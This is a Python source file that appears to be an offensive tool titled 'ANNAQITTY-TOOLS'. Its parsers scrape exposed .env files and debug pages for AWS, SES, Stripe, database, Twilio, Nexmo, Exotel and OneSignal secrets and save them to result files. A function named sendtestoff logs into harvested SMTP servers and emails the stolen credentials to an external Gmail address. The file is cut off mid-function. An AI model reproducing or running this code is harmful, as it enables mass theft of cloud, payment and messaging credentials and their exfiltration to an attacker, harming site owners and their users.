#*****ANNAQITTY-TOOLS*****#
###########################
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue
from colorama import Fore
from colorama import init
from time import time as timer
import time, datetime
from multiprocessing.dummy import Pool
import smtplib, json, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from multiprocessing.dummy import Pool
import warnings, random, socket, threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror
from random import randint

try:
    os.mkdir('Results')
except:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'


 # Total width of the number including leading zeros

#start = 1
#end = 9999
#width = 5

def random_with_N_digits(n):
    """Generate a random number with N digits."""
    if n <= 0:
        raise ValueError("Number of digits must be positive.")
    range_start = 10**(n-1)
    range_end = (10**n) - 1
    return random.randint(range_start, range_end)


def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    
    number = f"{random_with_N_digits(7)}"

        
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', '')) # paste your password generated by Mailtrap
    receiver_email = "scam.rest@gmail.com"
    message = MIMEMultipart('alternative')
    message['Subject'] = f"S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty >>> SMTP Number {number}"
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"""
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S.M.T.P - T.E.R.G.R.A.B</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            color: #333;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }}
        .container {{
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        .header {{
            background-color: #007bff;
            color: #ffffff;
            padding: 20px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 24px;
        }}
        .content {{
            padding: 20px;
        }}
        .content p {{
            margin: 0 0 10px;
            font-size: 16px;
            line-height: 1.5;
        }}
        .content p strong {{
            color: #007bff;
        }}
        .footer {{
            background-color: #f1f1f1;
            padding: 10px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }}
        .footer p {{
            margin: 0;
        }}
        .section-title {{
            font-weight: bold;
            margin: 20px 0 10px;
            font-size: 18px;
            color: #007bff;
        }}
        .section {{
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 4px;
            background-color: #f9f9f9;
            box-shadow: 0 0 5px rgba(0,0,0,0.1);
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
        }}
        td {{
            padding: 8px;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            text-align: left;
            padding: 8px;
            background-color: #f4f4f4;
        }}
        .details {{
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Anna Qitty Tools ### SMTP No. {number}</h1>
        </div>
        <div class="content">
            <p><p>Gotcha...!!!</p>
            <p><p>Below are the details you requested:</p><BR><BR>
            <div class="section">
                <p class="section-title">Details</p>
                <div class="details">
                    <table>
                        <tr>
                            <th>Label</th>
                            <th>Value</th>
                        </tr>
                        <tr>
                            <td><strong>URL</strong></td>
                            <td>{url}</td>
                        </tr>
                        <tr>
                            <td><strong>HOST</strong></td>
                            <td>{mailhost}</td>
                        </tr>
                        <tr>
                            <td><strong>PORT</strong></td>
                            <td>{mailport}</td>
                        </tr>
                        <tr>
                            <td><strong>USER</strong></td>
                            <td>{mailuser}</td>
                        </tr>
                        <tr>
                            <td><strong>PASSW</strong></td>
                            <td>{mailpass}</td>
                        </tr>
                        <tr>
                            <td><strong>SENDER</strong></td>
                            <td>{mailfrom}</td>
                        </tr>
                    </table>
                </div><p><p><p><BR><BR><BR>
                <p>Thanks for using this tool. If you have any questions or need further assistance, feel free to <a href="mailto:annaqitty@gmail.com">email me</a>.</p>
            </div>
        </div><p><p><BR><BR>
        <div class="footer">
            <p>&copy; 2024 Anna Qitty. All rights reserved.</p><p><p><BR><BR>
        </div>
    </div>
</body>
</html>
"""
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception as e: print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class drosteam:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('Results/PayPal_Sandbox.txt','a')
            save.write(url+'\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_SNS_KEY" in text:
                if "AWS_SNS_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
                    except:
                        sms_from = ''
                    try:
                        sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
                    except:
                        sms_deiver = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_SNS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_from = ''
                    try:
                        sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_driver = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS SNS KEY: '+str(aws_key)+'\nAWS SNS KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: \nSMS FROM: '+str(sms_from)+'\nSMS DRIVER: '+str(sms_driver)
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_sns_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_S3_KEY" in text:
                if "AWS_S3_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_S3_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_SES_KEY" in text:
                if "AWS_SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = drosteam().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            else:
                return False
        except:
            return False

    def stripe(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_KEY=" in text:
                    method = '/.env'
                    try:
                        stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
                    except:
                        stripe_key = ''
                    try:
                        stripe_secret = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
                    except:
                        stripe_secret = ''
                elif '<td>STRIPE_KEY</td>' in text:
                    method = 'debug'
                    try:
                        stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        stripe_key = ''
                    try:
                        stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        stripe_secret = ''

                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/STRIPE_USER.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def db_myer(self, text, url):
        try:
            if "DB_HOST" in text:
                if "DB_HOST=" in text:
                    method = '/.env'
                    try:
                        database_host = reg('\nDB_HOST=(.*?)\n', text)[0]
                    except:
                        database_host = ''
                    try:
                        database_port = reg('\nDB_PORT=(.*?)\n', text)[0]
                    except:
                        database_port = ''
                    try:
                        db_database = reg('\nDB_DATABASE=(.*?)\n', text)[0]
                    except:
                        db_database = ''
                    try:
                        database_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
                    except:
                        database_user = ''
                    try:
                        database_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
                    except:
                        database_pass = ''
                elif '<td>DB_HOST</td>' in text:
                    method = 'debug'
                    try:
                        database_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        database_host = ''
                    try:
                        database_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        database_port = ''
                    try:
                        db_database = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_database = ''
                    try:
                        database_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        database_user = ''
                    try:
                        database_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        database_pass = ''
                elif "GEOSERVER_WEB_UI_LOCATION=" in text:
                    method = '/.env'
                    try:
                        database_host = reg.findall(r'\nGEOSERVER_WEB_UI_LOCATION=(.*?)\n', text)[0]
                    except IndexError:
                        database_host = ''
                    try:
                        database_port = reg.findall(r'\nGEOSERVER_PUBLIC_LOCATION=(.*?)\n', text)[0]
                    except IndexError:
                        database_port = ''
                    try:
                        db_database = reg.findall(r'\nGEONODE_DATABASE=(.*?)\n', text)[0]
                    except IndexError:
                        db_database = ''
                    try:
                        database_user = reg.findall(r'\nGEOSERVER_ADMIN_USER=(.*?)\n', text)[0]
                    except IndexError:
                        database_user = ''
                    try:
                        database_pass = reg.findall(r'\nGEOSERVER_ADMIN_PASSWORD=(.*?)\n', text)[0]
                    except IndexError:
                        database_pass = ''
                elif '<td>GEOSERVER</td>' in text:
                    method = 'debug'
                    try:
                        database_host = reg.findall(r'<td>GEOSERVER_WEB_UI_LOCATION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except IndexError:
                        database_host = ''
                    try:
                        database_port = reg.findall(r'<td>GEOSERVER_PUBLIC_LOCATION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except IndexError:
                        database_port = ''
                    try:
                        db_database = reg.findall(r'<td>GEONODE_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except IndexError:
                        db_database = ''
                    try:
                        database_user = reg.findall(r'<td>GEOSERVER_ADMIN_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except IndexError:
                        database_user = ''
                    try:
                        database_pass = reg.findall(r'<td>GEOSERVER_ADMIN_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except IndexError:
                        database_pass = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(database_host)+'\nDB_PORT: '+str(database_port)+'\nDB_DATABASE: '+str(db_database)+'\nDB_USERNAME: '+str(database_user)+'\nDB_PASSWORD: '+str(database_pass)
                remover = str(build).replace('\r', '')
                save = open('Results/DATABASE.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False
    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = '/.env'
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        auhtoken = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        auhtoken = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TWILIO" in text:
                if "TWILIO_SID=" in text:
                    method = '/.env'
                    try:
                        acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_token = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        acc_token = ''
                    try:
                        phone = reg('\nVALID_TWILLO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                    try:
                        verify = reg('\nTWILIO_VERIFY_SID=(.*?)\n', text)[0]
                    except:
                        verify = ''                    
                elif '<td>TWILIO_SID</td>' in text:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_token = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_token = ''
                    try:
                        phone = reg('<td>VALID_TWILLO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        verify = reg('<td>TWILIO_VERIFY_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        verify = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_AUTH_TOKEN: '+str(acc_token)+'\nVALID_TWILLO_NUMBER: '+str(phone)+'\nTWILIO_VERIFY_SID: '+str(verify)
                remover = str(build).replace('\r', '')
                save = open('Results/ACCOUNT_TWILLIO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_nexmo(self, text, url):
        try:
            if "NEXMO" in text:
                if "NEXMO_KEY=" in text:
                    method = '/.env'
                    try:
                        nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
                    except:
                        nexmo_key = ''
                    try:
                        nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
                    except:
                        nexmo_secret = ''
                    try:
                        phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                elif '<td>NEXMO_KEY</td>' in text:
                    method = 'debug'
                    try:
                        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        nexmo_key = ''
                    try:
                        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        nexmo_secret = ''
                    try:
                        phone = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(nexmo_key)+'\nNEXMO_SECRET: '+str(nexmo_secret)+'\nNEXMO_NUMBER: '+str(phone)
                remover = str(build).replace('\r', '')
                save = open('Results/NEXMO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "EXOTEL_API_KEY" in text:
                if "EXOTEL_API_KEY=" in text:
                    method = '/.env'
                    try:
                        exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
                    except:
                        exotel_sid = ''
                elif '<td>EXOTEL_API_KEY</td>' in text:
                    method = 'debug'
                    try:
                        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_sid = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
                remover = str(build).replace('\r', '')
                save = open('Results/EXOTEL.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "ONESIGNAL_APP_ID" in text:
                if "ONESIGNAL_APP_ID=" in text:
                    method = '/.env'
                    try:
                        onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
                    except:
                        onesignal_auth = ''
                elif '<td>ONESIGNAL_APP_ID</td>' in text:
                    method = 'debug'
                    try:
                        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_token = ''
                    try:
                        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_auth = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
                remover = str(build).replace('\r', '')
                save = open('Results/ONESIGNAL.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY_DEV" in text:
